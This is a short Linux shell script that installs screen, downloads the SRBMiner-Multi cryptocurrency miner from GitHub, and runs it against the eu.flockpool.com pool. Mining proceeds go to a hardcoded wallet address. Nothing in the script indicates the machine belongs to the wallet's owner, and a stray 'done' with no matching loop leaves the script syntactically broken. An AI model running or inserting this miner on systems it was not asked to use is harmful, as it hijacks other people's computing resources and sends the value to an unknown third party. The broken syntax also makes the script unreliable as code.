#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.1/SRBMiner-Multi-0-9-1-Linux.tar.xz
tar -xf SRBMiner-Multi-0-9-1-Linux.tar.xz
cd  SRBMiner-Multi-0-9-1
./SRBMiner-MULTI --algorithm ghostrider --pool eu.flockpool.com:4444 --wallet RGGHJZX9GToW57DMxapRfUHKbpch76pE7M
done
sleep 999
